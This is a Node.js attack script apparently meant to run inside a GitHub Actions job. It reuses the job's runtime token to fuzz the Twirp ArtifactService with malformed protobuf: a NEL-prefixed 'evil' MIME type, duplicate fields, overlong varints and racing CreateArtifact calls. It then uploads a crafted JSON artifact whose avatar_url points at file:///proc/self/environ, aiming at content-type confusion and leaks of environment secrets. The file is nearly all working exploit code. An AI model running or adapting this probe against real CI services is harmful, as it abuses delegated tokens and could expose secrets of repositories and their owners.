'use strict';

const crypto = require('node:crypto');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';
const evil = Buffer.concat([Buffer.from([0xc2, 0x85]), Buffer.from('application/json')]);
const safe = Buffer.from('application/json');

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

function varint(value) {
  let current = BigInt(value);
  const result = [];
  do {
    let byte = Number(current & 0x7fn);
    current >>= 7n;
    if (current) byte |= 0x80;
    result.push(byte);
  } while (current);
  return Buffer.from(result);
}

function ld(number, value) {
  const bytes = Buffer.from(value);
  return Buffer.concat([varint(BigInt(number << 3 | 2)), varint(bytes.length), bytes]);
}

function vi(number, value, encoded) {
  return Buffer.concat([varint(BigInt(number << 3)), encoded || varint(value)]);
}

function wrapper(...values) {
  return Buffer.concat(values.map((value) => ld(1, value)));
}

function createBody(ctx, name, versions, mimes) {
  return Buffer.concat([
    ld(1, ctx.runId), ld(2, ctx.jobId), ld(3, name),
    ...versions.map((value) => Buffer.isBuffer(value) ? vi(5, 0, value) : vi(5, value)),
    ...mimes.map((value) => ld(6, value)),
  ]);
}

function parseFields(bytes) {
  const fields = [];
  let offset = 0;
  function readVarint() {
    let value = 0n;
    let shift = 0n;
    while (offset < bytes.length) {
      const byte = bytes[offset++];
      value |= BigInt(byte & 0x7f) << shift;
      if (!(byte & 0x80)) return value;
      shift += 7n;
    }
    throw new Error('truncated varint');
  }
  while (offset < bytes.length) {
    const tag = Number(readVarint());
    const number = tag >> 3;
    const wire = tag & 7;
    if (wire === 0) fields.push([number, wire, readVarint()]);
    else if (wire === 2) {
      const length = Number(readVarint());
      fields.push([number, wire, bytes.subarray(offset, offset + length)]);
      offset += length;
    } else throw new Error(`unsupported wire type ${wire}`);
  }
  return fields;
}

async function binaryRpc(ctx, method, body) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/protobuf' },
    body,
    signal: AbortSignal.timeout(15000),
  });
  const bytes = Buffer.from(await response.arrayBuffer());
  let signedUploadUrl = null;
  if (response.ok && bytes.length) {
    try {
      const field = parseFields(bytes).find(([number, wire]) => number === 2 && wire === 2);
      if (field) signedUploadUrl = Buffer.from(field[2]).toString('utf8');
    } catch {}
  }
  return {
    status: response.status,
    contentType: response.headers.get('content-type'),
    signedUploadUrl,
    responseHex: signedUploadUrl ? '' : bytes.subarray(0, 160).toString('hex'),
  };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
    signal: AbortSignal.timeout(15000),
  });
  return { status: response.status, body: await response.json().catch(() => ({})) };
}

async function finish(ctx, name, uploadUrl, payload) {
  const uploaded = await fetch(uploadUrl, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' },
    body: payload,
    signal: AbortSignal.timeout(15000),
  });
  const finalized = await rpc(ctx, 'FinalizeArtifact', {
    name, size: String(payload.length),
    hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}`,
  });
  const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
  const downloadUrl = signed.body.signed_url || signed.body.signedUrl;
  return { upload: uploaded.status, finalize: finalized.status,
    artifactId: finalized.body.artifact_id || finalized.body.artifactId || null,
    signed: signed.status, rsct: downloadUrl ? new URL(downloadUrl).searchParams.get('rsct') : null };
}

(async () => {
  const ctx = context();
  const payload = Buffer.from('{"full_name":"advanced/probe","owner":{"login":"p","avatar_url":"file:///proc/self/environ"}}');
  const hugeSeven = varint(0x100000007n);
  const cases = [
    ['baseline', [7], [wrapper(safe)]],
    ['dup-version-6-7-evil', [6, 7], [wrapper(evil)]],
    ['dup-version-7-6-evil', [7, 6], [wrapper(evil)]],
    ['dup-mime-evil-safe', [7], [wrapper(evil), wrapper(safe)]],
    ['dup-mime-safe-evil', [7], [wrapper(safe), wrapper(evil)]],
    ['inner-dup-evil-safe', [7], [wrapper(evil, safe)]],
    ['inner-dup-safe-evil', [7], [wrapper(safe, evil)]],
    ['invalid-utf8-85', [7], [wrapper(Buffer.concat([Buffer.from([0x85]), safe]))]],
    ['unicode-u0185', [7], [wrapper(Buffer.from('\u0185application/json'))]],
    ['overlong-seven', [Buffer.from([0x87, 0x00])], [wrapper(evil)]],
    ['wrapped-huge-seven', [hugeSeven], [wrapper(evil)]],
  ];
  for (let index = 0; index < cases.length; index += 1) {
    const [label, versions, mimes] = cases[index];
    const name = `protobuf-${index}-${Date.now()}.json`;
    console.log('START ' + label);
    try {
      const result = await binaryRpc(ctx, 'CreateArtifact', createBody(ctx, name, versions, mimes));
      const output = { label, create: result.status, contentType: result.contentType,
        accepted: Boolean(result.signedUploadUrl), responseHex: result.responseHex };
      if (result.signedUploadUrl) Object.assign(output, await finish(ctx, name, result.signedUploadUrl, payload));
      console.log('PROTO ' + JSON.stringify(output));
    } catch (error) {
      console.log('PROTO ' + JSON.stringify({ label, error: `${error.name}:${error.message}` }));
    }
  }

  for (let index = 0; index < 3; index += 1) {
    const name = `race-${index}-${Date.now()}.json`;
    let legacy;
    let raw;
    try {
      [legacy, raw] = await Promise.all([
        rpc(ctx, 'CreateArtifact', { name, version: 6, mime_type: '\u0085application/json' }),
        rpc(ctx, 'CreateArtifact', { name, version: 7, mime_type: 'application/json' }),
      ]);
    } catch (error) {
      console.log('RACE ' + JSON.stringify({ index, error: `${error.name}:${error.message}` }));
      continue;
    }
    const legacyUrl = legacy.body.signed_upload_url || legacy.body.signedUploadUrl;
    const rawUrl = raw.body.signed_upload_url || raw.body.signedUploadUrl;
    const output = { index, legacy: legacy.status, raw: raw.status,
      legacyUrl: Boolean(legacyUrl), rawUrl: Boolean(rawUrl),
      sameBlob: Boolean(legacyUrl && rawUrl && new URL(legacyUrl).pathname === new URL(rawUrl).pathname) };
    const chosen = rawUrl || legacyUrl;
    if (chosen) {
      try { Object.assign(output, await finish(ctx, name, chosen, payload)); }
      catch (error) { output.finishError = `${error.name}:${error.message}`; }
    }
    console.log('RACE ' + JSON.stringify(output));
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
